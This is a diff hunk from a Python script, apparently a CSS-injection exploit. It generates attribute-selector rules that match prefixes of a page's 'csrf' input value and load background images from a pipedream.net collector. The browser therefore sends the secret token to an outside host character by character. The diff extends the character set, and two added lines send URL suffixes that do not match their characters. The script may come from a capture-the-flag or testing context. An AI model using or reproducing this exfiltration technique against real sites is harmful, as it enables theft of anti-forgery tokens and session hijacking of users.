@@ -76,7 +76,12 @@ def build_css(chars):
         input[name="csrf"][value^="'''+chars+'''?"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''?);}
         input[name="csrf"][value^="'''+chars+'''*"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''*);}
         input[name="csrf"][value^="'''+chars+'''$"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''$);}
-        input[name="csrf"][value^="'''+chars+'''&"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''&);}'''
+        input[name="csrf"][value^="'''+chars+'''&"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''&);}
+        input[name="csrf"][value^="'''+chars+'''}"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''});}
+        input[name="csrf"][value^="'''+chars+'''{"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''{);}
+        input[name="csrf"][value^="'''+chars+'''#"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''#);}
+        input[name="csrf"][value^="'''+chars+''')"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%22);}
+        input[name="csrf"][value^="'''+chars+'''("]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%23);}'''
         file.write(str+str2) 
         file.close()
 
